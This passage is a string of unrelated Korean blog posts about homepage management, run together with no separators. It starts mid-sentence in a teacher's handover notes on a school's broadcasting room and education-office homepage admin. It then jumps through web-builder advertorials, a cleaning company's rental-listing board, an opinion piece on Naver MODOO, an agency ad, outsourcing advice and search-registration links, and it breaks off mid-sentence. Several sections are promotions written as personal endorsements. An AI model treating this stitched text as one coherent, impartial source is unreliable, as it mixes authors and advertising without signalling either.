따라 업무 달라짐. (우리학교의 경우 기본적인 활동만 함.)​5. 시험시간 종소리 바꾸기 - (우리학교 기준) 방송실 컴퓨터에 시보기(프로그램)를 이용하여 시작종과 종료종 시간대를 변경​6. 방송실 물품 확인하기(감사시 중요) - 중요한건 카메라... 개수!!! 꼭 확인. 방송실 뿐만 아니라 특별실 카메라까지​7. 방송실 물품 확인하면서 필요에 따라 불용처리 - 제대로 작동 되지 않거나 내용연수가 지난 카메라, 방송실 물품 불용처리(행정실문의)​​방송업무는 글로 정리하기 보다는 눈으로, 손으로 익혀야 하는 요소가  많기 때문에 이정도로 정리.이외 인수인계 해야 할 내용은 본방송실 기계 다루기, 체육관 방송실 기계 다루기, 시보기 사용법, 장비 설명 등.​  홈페이지관리1. 우선 홈페이지 관리자 권한을 부여 받아야 한다.          전임자 분께서 학교홈페이지관리 센터에 연락하셔서 개학 전 권한부여 받음.​2. 업무 관련하여 담당자가 사용하는 홈페이지는 2가지 - 00교육청 학교통합홈페이지 관리자 페이지  : 관리자 권한 부여받고 로그인 하면 학교홈페이지  시스템이나 메뉴를 관리할 수 있음- 학교통합 홈페이지 지원센터 : 홈페이지 관리 관련 문의사항이나 관리자 페이지에서 안되는 것들은 '학교요청사항'에 게시하면 해결​3. 새학기는 바꿔야 할 사항들이 많음(3월, 9월) - 학교장 인사말, 학교연혁, 학교 현황, 개인정보처리 담당자, 영샹정보처리 담당자, 교직원 안내, 연락처 확인, 학사일정 등록 등등..(학기초 공문으로 수정사항 알려줌)​ - 학사일정 수정은 본교 학교홈페이지에서 가능(로그인 후, 연간학사일정 페이지에서 하단에 보면 직접 입력 가능)​4. 팝업, 배너 설정 - 감사기간 안내, 교원평가 안내 등 교육청에서 배너, 팝업 설정하라는 공문이 내려오면 관리자 페이지에서 설정하거나 지원센터에 요청​5. 개인정보 관련 문서를 홈페이지에 기재하지 않도록 주의 - 우리 지역 교육청의 경우 홈페이지에서 2009년~2018년?에 게시된 게시글 중 첨부파일 개인정보 문서들을 확인하여 제출하라는 공문이 있었음. (게시글 파일 하나하나 확인하라함^^) - 간혹 숫자가 많은 파일은 개인정보로 인식하여 업로드가 되지 않는 경우가 있으니, 업로드가 되지 않을 경우 지원센터에 문의.​6. 그 외 홈페이지 메뉴 생성이나 간혹 학교장 인사말 수정, 학사일정 변경 등 중간중간 수정사항 있을 때 관리해주면 됨.​​​<추가>학교통합홈페이지 관리자용 로그인 :  http://cnemaster.kr/chkAuth.do 충청남도교육청 학교통합홈페이지 관리자로그인학교통합홈페이지 관리자 페이지에 오신것을 환영합니다.관리자 확인을 위해 인증서 로그인을 수행해주세요. cnemaster.kr  - 메뉴 수정 : 메뉴 관리 - 폴더 요청 - 하위메뉴 추가 - 교직원 소개 : 상세정보 클릭 후 수정 - 배너 설정도 가능하나... 잘 안되는 경우가 많아요. 그래서 아래 지원센터에 요청을 합니다.​​충청남도 학교 통합 홈페이지 지원센터 : http://support.cneportal.kr/main.do 학교통합 홈페이지 지원센터 홈페이지에 오신것을 환영합니다홈 로그인 회원가입 사이트맵 지원센터란? 운영지침 홈페이지 템플릿 자료실 개인정보 검증요청 통합지원서비스 연혁 및 교직원소개 수정기능 신청 설문조사 더보기 더보기 support.cneportal.kr  - 배너, 팝업, 사진수정, 인사말 등 거의 대부분 요청(관리자만 가능)- 다음 인수인계시 관리자변경요청 꼭! 해야함.​ 요즘은 사람들은 오프라인 보다 온라인에서 정보를 얻습니다.시간을 들여 일일이 찾아 다니지 않아도클릭 한번으로 매우 방대한 양의 정보를 얻을 수 있다는 편리함이 가장 크 이유겠지요.​​이는 부동산 관련 정보도 마찬가지입니다.과거처럼 동네별로 있는 부동산을 전부 다니는 것이 아니라부동산 관련 홈페이지, 어플을 통해 정보를 얻지요.​ ​그 중에서도 부동산 홈페이지는 매우 대중화 되어 있고,많은 오프라인 부동산에서 자체 홈페이지를동시에 운영하고 있습니다.​근래에 부동산 창업을 준비하시는 분들을 만나보면 그들 역시 대부분 홈페이지 제작을 생각하고 있고요.더 많은 고객과 만날 수 있는 장점 때문일텐데요.​오늘은 부동산홈페이지제작을 준비하는 분들께 도움이 될만한 정보를 드리겠습니다. ​ ​ 홈페이지 제작 왜 중요할까?홈페이지는 오프라인의 매장과 같은 역할을 합니다.따라서 요즘 제작은 필수고 제작 시 매장에 신경쓰는 만큼이나 신경을 써야 합니다.​먼저 방문자들이 매물 정보를 쉽게 볼 수 있도록 인터페이스가 편리해야 하고검색, 비교, 지도, 현재위치파악 등의 서비스를 제공해야 합니다.즉 기술이 필요하지요. ​ ​또 무척이나 방대한 매물 정보를 다루기 때문에이를 관리하는 관리자에게도 편해야 하는데요.정보를 저장하여 올리거나 수정하는데 불편함이 없어야 합니다.​이러한 이유 때문에 홈페이지 제작 시전문가의 도움이 꼭 필요한데요. ​스스로 만들기에는 너무나도 어렵고 복잡한 작업이 많고전문지식과 기술이 절대적으로 필요하기 때문입니다.​ ​ 홈페이지 제작 비용홈페이지 제작 시 전문가에 의뢰하게 되면 가장 고민이 되는 부분이 바로 가격입니다.부동산홈페이지제작 비용은 업체마다 차이가 있지만, 가장 비싸게 부르는 업체는 3백만원 이상을 부르기도 합니다. ​소자본 창업을 준비하고 있다면고가의 비용은 참으로 부담되지요.그렇다고 무조건 저렴한 업체만 찾는 것도 안됩니다.매력적인 홈페이지를 만들어낼지 담보할 수 없기 때문입니다.​가격은 합리적이면서 퀄리티는 높은 홈페이지 제작 방법을 알려드리겠습니다.​> 부동산홈페이지제작 업체 확인하기​ 합리적으로 홈페이지 제작하기 월 3만원으로  홈페이지 제작과 관리를 한번에!이 업체는 홈페이지 제작 비용이 무료입니다.대신 홈페이지 관리비용을 받습니다.​그러면 의구심이 들지요. 혹시 관리비가 어마어마하게 비싼 것은 아니까? 저 역시 그랬으니까요.​​월 관리비가 3만원으로 무척 저렴합니다.​월 3만원을 지불하면무료로 부동산홈페이지제작이 가능하고또 관리까지 맡길 수 있습니다.​  제작 후 리뉴얼과 수정도 무료​제공하는 기타 서비스들도 아주 만족스럽습니다.홈페이지는 제작 보다 관리와 운영이 더욱 중요한데요.대부분의 업체들은 홈페이지 제작 후 수정이 필요할 땐별도 비용을 요구합니다.하지만 이 업체를 이용하면관리비를 지불했기 때문에 수정이 필요할 때마다 추가비용 없이 수정이 가능합니다.​또 때에 따라 리뉴얼도 필요하고요.이 때마다 별도의 비용을 지불하고 리뉴얼을 해야하지만이 또한 무료입니다.​홈페이지를 운영하면 어차피 관리업체가 필요한데무료로 홈페이지를 제작해주고수정, 리뉴얼까지 무료인 곳이 좋지 않을까요?  다양한 무료 서비스 제공이 밖에도 다양한 무료 서비스들을 제공하는데요.PC용 사이트, 모바일용 사이트, 도메인 등록, 2차백업 서비스, 방화벽 세팅 서비스 등을 무료로 제공합니다.​홈페이지를 운영하다보면, 홈페이지가 다운되는 일이 발생하는데요.​서버 과부하나 해킹, 바이러스 등 다양한 원인으로 발생하게 됩니다.전문가가 아니면 원인 조차 파악하기 어렵습니다.이런 문제가 발생했을 때 즉각 도움을 받을 수 있기 때문에안심할 수 있습니다.​  나를 위한 맞춤 제작홈페이지 디자인의 퀄리티 역시 걱정할 필요가 없습니다.정해진 폼에서 약간의 수정 작업을 거쳐차별점이 없는 홈페이지를 제공하는 업체들도 있지만이 업체는 늘 새롭게 제작해줍니다.​즉, 내 마음에 들게 내 머리속에 있는모습으로, 내 아이디어를 반영해서맞춤형 홈페이지를 제작해줍니다.​담당자도 친절하고 소통이 잘 되더라고요.저는 개인적으로 이 부분이 참 좋았습니다.7년 경력이 있는 회사고 홈페이지 제작건수가 1만건이 넘는다고 하니 이 업계에서는 베테랑 중에 베테랑이 아닐 수가 없습니다.  임대가 아닌 평생 소유​홈페이지제작 업체 중에서는임대형으로 홈페이지를 제공하는 경우도 있습니다.즉 1년에서 2년 정도 계약을 해서 그 기간동안 임대를 하는 것입니다.임대비용은 1백만원 정도 되고요.계약기간이 지나고 나면임대비용을 추가로 지불하고 재임대를 하거나홈페이지를 반납해야 합니다.​이런 조건은 사업을 하는 입장에서 당연히 좋지 않습니다.당연히 홈페이지의 소유는 나에게 있는 것이 좋습니다.​소개해드린 업체처럼 제작 후 소유권을넘겨주는 곳을 선택하는게 현명합니다.​  포털사이트 등록서비스로 홈페이지 노출도 good​사업이 성공하려면 방문자가 많아야겠지요.아무리 예쁘게 만들어 놓고, 아무리 매물 정보가 많아도사람들이 오지 않으면 아무 소용이 없습니다.모든 홈페이지 운영자들의 고민이 바로 어떻게 사람들을 많이 방문하게 할까? 일 수 밖에 없습니다.방문자가 많아야 거래가 성사될 확률이 높기 때문이지요.방문자수를 늘리기 위한가장 좋은 홍보 방법은 포털사이트에서 검색이 잘 되게 하는 것입니다. 즉, 포털에서 노출이 잘 되도록 하는 것입니다.​소개해드린 업체는 홈페이지가 포털에 노출이 잘 되도록 등록해주는 서비스를 무료로 제공합니다.​큰 도움이 되겠지요?매우 매력적이지 않나요?홈페이지 제작은 저를 믿고 한번 의뢰해 보시기를 권해드립니다.​ ​​> 부동산홈페이지제작 비용상담센터 <​​>> 덧붙여, 경험담저는 현재 홈페이지를 3곳 운영중인데요.부동산을 비롯해 각각 다른 종류의 상품을 판매중입니다.​사실 하다가 잘 안되어서 접은 적도 있지만시행착오를 거쳐 지금은 다행히도 안정적으로 운영하고 있습니다.지금 홈페이지를 준비하고 있는 분들을 위해제가 홈페이지를 운영하면서 느낀 점을몇가지를 말씀드릴게요. 홈페이지 준비 시 필요한 점 과해도 모자란 홍보​야심차게 홈페이지를 열었지만,생각만큼 처음부터 사람들이 많이 오지 않습니다.즉 매출이 잘 나지 않아요.이때에는 가만히 있는 것이 아니라 해야할 것들이 있습니다.​바로 홍보인데요.우선은 SNS를 통해서 홍보하는 것이 좋습니다. 처음에는 피드백이 별로 없고문의도 별로 없습니다.하지만 컨텐츠가 쌓여가면서부터슬슬 문의가 들어오기 시작합니다. ​인터넷은 진입장벽이 높지 않습니다.그래서 많은 업체들의 홈페이지가 생겨나고 또 많이 사라집니다.정말 열심히 하셔야 합니다.광고비도 좀 쓰셔야 하고요.직접 발로 뛰고 손을 움직이는 홍보도 열심히 하셔야 합니다.​  카테고리 구성은 전략적으로​홈페이지를 이미 만드신 분이거나, 컨셉을 거의 잡으신 분이라면 한번 체크해보시기 바랍니다.중요한 것이 바로 카테고리 구성입니다.​상품별로 카테고리를 잘 정해서정리해야 합니다.그룹핑을 잘 하셔야 하는 거죠.그리고 한가지 상품을 장바구니에 넣고 나면,자연스럽게 또다른 상품으로 연결되도록 해야 합니다.​포털사이트 쇼핑페이지를 보면 아시겠지만내가 어떤 상품을 검색해서 클릭하게 되면비슷한 종류의 상품을 추천하는데요.이처럼 방문자의 특성을 파악해비슷한 상품을 연달아 볼 수 있도록 함으로써우리 홈페이지에 오래 머물도록 하는것이 중요합니다.​동종 업계의 홈페이지를 많이 살펴보세요.소위 '잘 나가는' 업체 홈페이지는 필수로 스터디해보시고요.뭔가 다른 점을 찾으실 수 있습니다. ​홈페이지들을 보다 보면, 기분이 좋은 곳도 있고 뭔가 나를 불편하게 하는 곳도 있고마음에 들지 않는 곳도 있습니다.​카테고리는 어떻게 나누는 것이 좋을 지,어떤 색상이 기분을 좋게 해 주는지,어떤 구성이 좋은지 다른 홈페이지를 통해 분석하고 고민해보세요.​ ​ 사업 성공을 위해 꼭 필요한 부분 직원 교육​사업 규모가 커지고홈페이지 방문자도 늘게 되면 직원을 늘리게 되는데요.반드시 직원 한명 한명 교육을 하세요.알아서 잘 하겠지 손 놓고 있으면알아서 잘 못합니다.사장인 나 처럼 열심히 하는 직원, 알바는 별로 없습니다.교육을 통해서 내가 원하는 사람으로 육성해나가야 합니다.고객에게 전화 하는 법, 게시판 관리하는 법 등 하나하나교육이 필요합니다.​  세금 관련 ​사업을 하면서 신경써야 하는 것이세금 관련 업무입니다.사업자 등록을 하고 나면 세금 신고를 해야 합니다.비록 매출이 없다 하더라도 세금신고는 의무로 해야 합니다.매출이 있으면 있다, 매출이 없으면 없다하고 신고하셔야 하는데요,은근히 까다롭고 귀찮은 일입니다.자칫잘못하면 세무조사가 나오기도 하고 손해가 많습니다.​이럴 경우에는 세무사에게 맡기는 것이 현명한 방법입니다.개인이 하기에는 신경쓸 것이 너무 많고,자칫 놓치는 것이 생기면 손해가 막심하기 때문이에요.​여기까지 도움이 될 만한 몇가지를  정리해 보았습니다.​  모두모두 준비하시는  사업 다 잘 되시기 바라고,궁금한 것은 댓글로 물어보시면 성의껏 답변해 드릴게요.​​​ ​ 홈페이지관리업체들이 버려야할 생각들 1. 홈페이지관리는 팝업창과 텍스트수정,상품등록등이 전부라고 생각한다.2. 도메인과 호스팅은 별개라고 생각한다. - 의뢰업체 입장에서는 한꺼번에 관리해줬으면 한다.3. 키워드광고나 검색등록은 원하면 대행해 줄수 있으나, 적극적으로 유도를 하지 않는다. 자사의 사업영역이 아니면...4. 돈에 비해 너무 많은것을 요구하는 업체들 때문에 정작 중요한 일을 못한다는 생각 - 체계적인 관리로 업체를 리더해 가야하는것도 관리업체의 책임이다.5. 홈페이지관리는 제작보다 돈이 안되고 신경써야할 부분이 너무 많다는 생각 -- 홈페이지를 관리한다는 생각보다는 조금 넓게 웹을 관리하고 또다른 부가가치를 창출해 내야한다는 생각을 가져야 할것 같다..... 이상 나름의 생각을 정리했다. 업체들에 대한 나름의 생각...정말 개념없는 업체와 , 말이 통하지않는 소규모 업체들은 되도록 과감히 버려야 한다. 웹에 대해서 배우지 않고 준비가 되어 있지않는 업체들은웹에 들어올 자격이 없는것이다.  웹아웃소싱 - 이지테이크 http://www.weboutsourcing.co.kr ​청운주택관리 홈페이지  청운주택관리-대전,세종,충남,충북 청소,건물유지,보수대행, 인테리어, 단열공사대전,세종,충청 준공청소,입주청소,이사청소,거주청소,계단청소,바닥왁스,유리창청소,인테리어청소,매장청소 각종청소 대행,옥상방수,지붕방수,건물유지보수, 인테리어, 단열공사,곰팡이제거cwhm.co.kr  에서 회원 가입을 하신후 누구 라도 매물을 등록 하실수 있도록 했습니다. ^^ (허위매물 등록시 홈페이지 IP차단 과 함께 홈페이지 접근 차단 됩니다.)​요즘 코로나19 로 인하여 여러 분야의 분들이 힘들어 하고 계시지만 특히 원룸, 상가 등을 가지고 계신분들이 부동산에 내놓자니 복비등 지출이 심하고 방도 안나가고 상가도 안나가고 힘들어 하시는 분들이 많이 계시더라구요. 그래서 저희 청운주택관리 홈페이지에 매물을 올리실수 있도록 작은 공간을 마련 했습니다.​회원가입만 하시면 건물주 분들이던 새입자 분들이던 누구라도 글을 등록 하실수 있습니다.​회원가입을 하셔야 되는 이유는 허위매물, 사기 등을 방지 하기 위함 입니다. ^^​우리 다 같이 힘을 내서 이놈에 코로나19 훌훌~ 털이 버리고 하루 라도 빨리 일상생활로 돌아 가자구요. ^-^​http://cwhm.co.kr > 상단메뉴 커뮤니티 > 동네월세방 메뉴를 이용 하시면 됩니다. ^^​바로가기 : http://cwhm.co.kr/bbs/board.php?bo_table=review 동네월세방 1 페이지 > 청운주택관리-대전,세종,충남,충북 청소,건물유지,보수대행, 인테리어, 단열공사대전,세종,충청 준공청소,입주청소,이사청소,거주청소,계단청소,바닥왁스,유리창청소,인테리어청소,매장청소 각종청소 대행,옥상방수,지붕방수,건물유지보수, 인테리어, 단열공사,곰팡이제거cwhm.co.kr ​#대전원룸 #대전1.5룸 #대전월세방 중소기업 홈페이지 제작 무시 못하죠!!(최.저가)​​ ​​​회사를 설립한다고 하면 기본적으로 홈페이지는 있어야 하죠 아니면 무수히 많은 고객을 대상으로 우리회사를 표현할 길이 없어요 회사의 연혁이나 제품등의 안내등을 위해서라도 홈페이지는 있어야 하는데요 결국 기업의 홈페이지는 회사의 오늘과 내일 그리고 과거까지 알수 있습니다 ​​이렇게 중요한 홈페이지 제작 어떻게 진행해야 하며 과연 적당한 금액은 어느정도인지 처음이라면 잘 모릅니다 저도 그랬으니까요 홈페이지 견적 여러곳에서 받았지만 아직도 적당한 곳을 믿음이 가는 곳을 찾지 못했다면 일단 오늘 이 자리 한번 알아보는 시간 가져보겠습니다 ​​​​ ​​​  ​​ ​​​중소기업 홈페이지 구축 업체  찾을때는 이정도는 꼭 주의해주십시오 ​ NO 프리랜스!!전문 디자인들의 플랫폼 ​일반적으로 중소기업 홈페이지 제작 의뢰할때 이런거 잘 확인하지 않습니다 어찌됐던.. 결과물을 따질건데요 하지만.. 프리랜.스를 고용한 곳이  많고 그에 맞게디자인을 입히기 때문에 그런곳보다직접 디자인이 작업한 플랫픔 제작업체를 선택해주셔야 현명하죠 ​​​ ​​​​ 홈페이지 소유권인 이전과비용절감 효과​중소기업 홈페이지 제작 시 홈페이지 형태, 방식을언급하지 않을경우도 있습니다 단지 금액이 얼마인지 계약기간이 얼마인지 등인데요 이 소유권의 대해서 좀더 확실히 해볼 필요가 있습니다 ​​단순히 1년이나2년 3년의 기간의 재계약이임대형식의 홈페이지로 계약시 '당연 소유권 이전은 안될 뿐더라 임의적인수정이 안되는데요 ​​그에 비해 독립형식의 홈페이지는 월 3만원의관리비/ 제작비 " 0" 으로 시작해서 5년뒤는 비용이 전혀 발생하지 않습니다 당연히 소유권은 고객에게...임.의수정도 가능하죠 ​​​​​중소기업 홈페이지 제작 문의하기 ​​​ 중소기업 홈페이지 구축+유지보수 세팅​단순히 홈페이지 제작만을 하는 업체의경우 고정된 디자인에 따라 제작에서 그치겠지만오늘 알아보는 곳은 홈페이지 제작 과 함께 3만원 관리비만의 혜택 또한 홈페이지 유지의 따른 보수세팅까지해드리고 있습니다 ​​기업에서 홈페이지의 해.킹이나 바이러스 등의 문제를 사전에 차단할 수 있는 방화벽 및 백신 프로그램 등을 셋팅함으로서 보다 안전한 홈페이지관리가 진행되는 것이죠 ​​​ ​​​여기까지 중소기업 홈페이지 구축 관련한내용 알아봤습니다 업체에서 견적은 당연히 받아보겠지만 몇군데 기본으로 하실텐데요 구성이나 금액적으로 자부심을가진 곳이니 한번 확인해보시길 바랍니다 ​​​​​ Previous imageNext image ​​​​​ ​​​​     네이버에서 이번에 모바일 홈페이지를 누구나 무료로 만들 수 있는 모 서비스(MODOO)를 개발했다. 과거에 개인 PC홈페이지를 무료로 만들 수 있는 서비스와 같은 것 같다. 이런 서비스를 개시한 이유는 무엇일까? 나는 고민도 안해봤다. 왜냐하면 지금도 그때도 관심이 없기때문이다. 지금 모바일 개인 홈페이지 문제가 아니다. 모바일 홈페이지는 PC홈페이지와는 다르게 상당히 고퀄리티를 사용자들이 요구한다. 모바일 홈페이지가 최적화(상당히 어렵다) 되지 않으면 버림 받기 쉽다는 것이다. 아이폰용 앱을 보면 그런 것을 알 수 있다. 모바일 홈페이지를 적당하게 대충 운영하는 것이 쉽지 않다는 것이다. 요즘 주의깊게 봤더니 PC홈페이지들의 폰트가 커진 것을 알 수 있다. 특히 주요 고객이 나이가 많은 분들인 회사의 홈페이지가(병원) 그런 것 같다. PC에서는 당연히 커진 글씨때문에 홈페이지 이용이 쉽고 모바일에서도 필요하다면 이용하는게 어렵지 않다. 단, PC홈페이지가 정말 제대로 최적화 되어야 한다. 디자인과 메뉴 이용이 직관적이어야 하고 가장 필요로 하는 정보를 바로 모바일에서 찾을 수 있도록 해야 한다.모바일 홈페이지 안하는 것보다는 운영하는게 낫다? ​제대로 못할 것이면 아예 모바일 홈페이지를 운영하지 말고 PC홈페이지를 제대로 최적화 하는게 낫다고 생각한다. 물론 차후 모바일 홈페이지를 운영할 수 있는 방법을 찾아야 한다. PC홈페이지도 제대로 운영 못하는 회사가 모바일 홈페이지를 제대로 운영하기 어렵다고 생각한다. 운영이란 것보다는 회사는 수익을 내야 한다고 생각하면 모바일 홈페이지를 운영하는거 어렵지 않게 판단할 수도 있다.네이버 모두(MODOO) 안녕~          ​요즘에는 홈페이지가 필수적으로 필요합니다. 인터넷을 기반으로 하는 사업들은 물론이고 그렇지 않은 사업들도 기본적으로 홈페이지를 가지고 있죠. 모든 것을 소비자들에 의해서 변화하는데 소비자들은 이제 생활에 필요한 정보들을 TV가 아닌 인터넷에서 스스로 수집하고 분석하기 때문입니다. 이제 인터넷에서 정보가 돌지 않으면 사람들은 그 존재 자체를 모르는 수준까지 와버렸습니다. 인터넷 의존도는 매년 높아지고 있고 있죠. 이러한 기본적인 것들 외에도 홈페이지는 인터넷의 마케팅과도 밀접한 연관이 있는 만큼 어떠한 사업을 하더라도 홈페이지는 이제 필수조건이 되었습니다. 에이치엘스토리는 홈페이지구축은 물론이고 그 이후의 홈페이지 관리와 홍보도 확실하게 해드립니다.​​​  ​에이치엘스토리의 홈페이지구축은 확실한 기획에서부터 시작합니다. 어떠한 주제를 담고 있는지 파악하고 그에 맞는 디자인과 구성을 자체적으로 제작을 하고 적용하고 있습니다. 이를 위하여 기획팀과 미디어팀, 디자인팀, 홍보팀 등으로 팀이 구성되어 있고 각 팀들의 구성원들은 전부 그 분야의 전문가들도 되어 있죠. 저희는 해당 전문가들이 더욱 원활한 작업을 할 수 있도록 각종 촬영 장비들과 편집 시설, 자체적인 스튜디오 등 제작 환경 역시 확실하게 갖추고 있습니다. 이는 자연스럽게 홈페이지의 전체적인 퀄리티 상승은 물론이고 합리적인 가격으로 귀결됩니다.​​​  ​홈페이지구축 자체는 업체마다 다릅니다. 갖추고 있는 제작 환경에 따라 말이죠. 저희 업체만큼 자체적인 환경이 되어 있는 곳은 그렇게 많지 않습니다. 다양한 기술들이 모여 홈페이지가 만들어지는데 부족한 부분은 그 분야의 프리랜서를 고용하거나 파트를 덜어내어 외주업체에게 맡기면서 해결하죠. 그러나 홈페이지는 디자인이고 디자인이라는 작업은 밸런스라는 것이 매우 중요합니다. 어떤 부분이 부족해서도 안되고 넘쳐서도 안되며 이러한 균형은 각 팀들이 지속적으로 소통을 하고 보완을 하면서 이루어집니다. ​중요한 파트 하나를 외주 업체에게 맡겨버리는 것만으로도 이미 균현은 깨져버리게 되고 소통이 부족하다 보니 결과물을 받아보면 초기에 기획하였던 컨셉과는 다른 방향으로 나오거나 조합이 안되는 경우도 많습니다. 하지만 시간적인 부담도 있고 하여 그냥 밀어붙이는 경우가 대부분이죠. 외주를 맡기는 것 자체는 꼬리에 꼬리를 무는 제작 방식으로 제작비 역시 자연스럽게 오르게 됩니다. 그 부담은 고스란히 여러분들에게 돌아가게 되죠. ​​​    ​에이치엘스토리는 홈페이지구축에 필요한 모든 작업을 자체적으로 해결할 능력이 있습니다. 그래서 프리랜서를 고용하거나 외주업체 사용 없이 거품을 걷어내고 합리적인 가격으로 언제나 유지하고 있으며 그 퀄리티 또한 언제나 견고하고 저희 업체만의 개성을 담고 있습니다.​​​     ​10년도 이후부터 활성화된 모바일 환경에 맞게 홈페이지도 효율적으로 관리할 수 있도록 적응형, 반응형, 하이브리드형과 같은 방식으로 제작해드립니다. 이제 한 가지의 홈페이지로 PC, 모바일, 태블릿 등의 다양한 디스플레이 환경에서 효율적이 운영이 가능합니다.​​​  ​저희는 1:1 담당자를 여러분들에게 배치합니다. 작업에 대한 문의나 피드백을 회사 카카오톡, 이메일, 전화 등으로 요청하시면 빠르게 답변드리고 처리해드리고 있으며 홈페이지 운영을 하면서 겪게 되는 여러 가지 기술적인 문제들도 저희가 미리 확인하고 처리해드립니다.​홍보는 검색 결과에 홈페이지가 자연스럽게 노출될 수 있도록 빅데이터로 조사하고 분석한 키워드들을 사용하고 있으며 상위 노출 방식으로 진행하여 1차원적인 홍보가 아닌 더욱 실리적인 방향으로 진행이 됩니다.​​​  ​여러분들의 목적은 단순히 홈페이지구축 하나만이 아닐 겁니다. 그 이후 관리와 홍보를 통하여 더욱 안정적인 마케팅과 운영을 하기 위함이죠. 그러나 이러한 궁극적인 목표는 언제나 쉽게 잊혀버리게 됩니다. 단순히 홈페이지만 만드는 것이 아니라 그 이후의 관리와 홍보 모든 것을 담당할 수 있는 업체를 선정하시기 바랍니다! 저희 에이치엘스토리는 이를 위한 역량과 환경 모든 것을 갖추고 있습니다.​​홈페이지 바로가기 클릭전화상담 바로가기 클릭1588-1815  ​이번에 회사 홈페이지 리뉴얼을 위해 기획에, 디자인, 외주업체 관리를 하며 느낀 내용입니다. 홈페이지 제작을 외주업체로 맡기면 알아서 해주겠지 하는 사람들이 많습니다. 홈페이지 제작 단가가 백만 원단위라는 것은 알아서 안 해주겠다는 뜻입니다. 400만 원 단가는 기획자, 디자이너, 개발자 인건비도 안 나옵니다. 기존에 만들어진 틀로 찍어내는 수밖에 없습니다. 다른 방법이 있다면 그 회사의 포트폴리오 중 우리 업종과 비슷하고 디자인, UI 구성이 깔끔하게 나온 게 있다면 그거랑 똑같이 만드는 방법이 있습니다. 이게 400만 원 홈페이지 현실입니다.   ​먼저 어떤 홈페이지를 만들지 컨셉과 내용, 사진자료, 컨텐츠가 다 갖춰진 상태에서 제안을 해야 쓸만한 시안이 나옵니다. 기획력이 있어 홈페이지를 어떻게 구성할지 알아야 하고 UI/UX에 대한 지식이 있어 어떻게 구성했을 때 홈페이지에 들어온 소비자를 현혹시킬지 머릿속에 그려야 합니다. 간단한 포토샵 정도는 할 줄 알아서 원하는 사항을 시각화하여 보여주거나 안되면 사례나 샘플 정도는 찾아보는 수고를 해야 합니다.  ​너무 홈페이지 제작업체 위주 같지만 이게 현실입니다. 최소한 이 정도 해야 제대로 나옵니다. 컨텐츠 하나하나 디자인을 입히고 구성을 바꿔 제안하고 마음에 안 들면 수정, 제안, 설득을 반복하는 친절한 작업은 천만 원단위의 비용입니다. 대게 이런 시장 논리를 모른채 어디서 본 멋진 홈페이지를 던져주며 여기처럼 만들어주세요. 하고 끝입니다. 이렇게 해선 돈, 시간만 날립니다.  ​아웃소싱의 핵심은 이겁니다. 내가 확실히 그 시장의 아이템에 대해 잘 알고 컨트롤할 수 있는 수준이면 외주를 주면 됩니다. 내가 컨트롤 타워가 돼서 디테일한 색깔에서 문구 레이아웃 구성까지 하나하나 지시, 결정해야 합니다. 나도 모르는데 나보다 모르는 사람이 알아서 해주기를 바란다? 그 프로젝트는 산으로 갈 가능성이 높습니다.  홈페이지 홍보와 관리를 위해 아주 기본적인 사항을 정리해 본다. 포털 검색을 통해서 내 홈페이지가 노출 될 수 있도록 포털에 등록한다. 1. 네이버https://searchadvisor.naver.com 네이버 서치어드바이저네이버 서치어드바이저와 함께 당신의 웹사이트를 성장시켜보세요searchadvisor.naver.com ​ 2. 다음https://register.search.daum.net/index.daum Daum - 검색등록Daum 검색등록 사이트 검색을 무료로 등록할 수 있는 서비스입니다. 언제든 정보보완 수정이 가능하며, 등록 후에는 Daum 검색결과에 노출되어 수많은 네티즌들이 방문하게 됩니다. 신규등록하기 조회하기 등록 변경 삭제 조회 사이트 검색 지역정보 블로그 등록 URL 확인 0 /200 byte 검색등록 처음이세요? 등록신청에 대한 안내와 절차를 자세히 보실 수 있습니다 자세히보기 검색등록 가이드 검색 노출에 필요한 기준을 반드시 확인하세요 자세히보기 제출서류 안내 사이트 업종별 필수 제출서류를 꼭 확인하세요 자세히보기 검색등록 절차 검...register.search.daum.net ​3. 구글https://search.google.com/search-console Google Search ConsoleImprove your performance on Google Search Search Console tools and reports help you measure your site's Search traffic and performance, fix issues, and make your site shine in Google Search results Start now Optimize your content with Search Analytics See which queries bring users to your site. Anal...search.google.com ​내 홈페이지에 접속한 사용자, 접속한 국가, 접속한 브라우저 등 다양한 통계 정보를 보기 원할 것이다.이러한 정보를 제공해 주는 사이트들이 있다.이 곳에 내 홈페이지를 등록하면 다양한 통계를 살펴볼 수 있다. 1. 구글 애널리틱스https://support.google.com/analytics/answer/1008015?hl=ko 애널리틱스 시작하기 - 애널리틱스 고객센터애널리틱스 시작하기 웹사이트에서 기본 데이터를 수집하려면 다음 단계를 따르세요. 애널리틱스 계정을 만들거나 계정에 로그인합니다. google.com/analytics 으로 이동합니다. 다음 중 하나를 수행합니다. 계정을 만들려면 무료로 시작하기 를 클릭합니다. 계정에 로그인하려면 애널리틱스에 로그인 을 클릭합니다. 애널리틱스 계정에서 속성을 설정합니다 . 속성은 웹사이트 또는 앱을 나타내며, 애널리틱스에서 사이트 또는 앱의 데이터를 수집하는 지점입니다. 속성에서 보고서 보기를 설정합니다 . 보기를 사용하면 원하는 데이터만 모아서 확...support.google.com  2. 네이버 애널리틱스https://analytics.naver.com/ 네이버 애널리틱스실시간분석 지금 내 사이트에 방문한 이용자 수, 유입 검색어, 네이버 검색광고 전환 등 사이트 이용 현황을 한눈에 파악할 수 있습니다. 이를 이용하여 마케팅 활동의 시작 여부와 효과를 실시간으로 측정하고 개선할 수 있습니다. 유입분석 방문자들이 어떤 유입채널을 통해 내 사이트에 방문하는지, 상세하게 파악할 수 있습니다. 유입정보를 알면 많이 유입되는 채널, 검색어 등에 집중하여 보다 효과적으로 사이트 방문을 유도할 수 있습니다. 페이지분석 내 사이트에서 가장 인기있는 페이지는 어디인지, 각 페이지에 방문자가 머무르는 시간은 얼마나 ...analytics.naver.com   인터넷 사용자들이 어떤 검색 엔진을 사용하지는 궁금할 것이다.다음 사이트를 참고하면 그 궁금증이 해소될 것이다.오늘 살펴 본 지난 1달간의 검색 엔진 사용 현황이다.  http://trend.logger.co.kr/trendForward.tsp InternetTrend™로그분석, 웹 로그분석, 웹로그분석, 웹 로그 분석, 웹로그 분석, VRM, 접속통계 분석, 방문자 분석trend.logger.co.kr  홈페이지를 통해 원하는 바를 모두가 이루기를 간절히 기원해 본다.  #홈페이지 #홍보 #관리 #통계 #검색 #네이버 #다음 #구글 #애널리틱스 #서치콘솔 #서치어드바이저 #internettrend​ 정말 이상한 이상화 기념 사업회의 홈페이지 관리 02!!!헐~~ 도대체 게시판 관리의 원칙이 있긴 한건지 궁금하네요.게시글을 지울려면..뭔가 좀 